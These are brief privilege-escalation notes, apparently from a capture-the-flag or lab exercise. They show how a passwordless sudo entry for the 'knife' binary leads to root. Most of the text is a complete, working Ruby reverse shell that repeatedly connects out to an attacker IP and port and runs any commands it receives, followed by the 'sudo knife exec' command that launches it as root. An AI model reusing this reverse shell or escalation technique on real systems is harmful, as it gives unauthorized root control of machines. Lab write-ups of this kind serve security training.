* Run sudo -l and see that you can execute the knife binary as root without a password
* make a ruby script for a reverse shell
```ruby
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "10.10.14.17" 
#Set the Remote Host Port
PORT = "9002"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |
              IO.copy\_stream(stdout\_and\_stderr, sock)
              end  
  end
rescue
  retry
end
```
* Run command to get root shell:
	* sudo knife exec *shell.rb*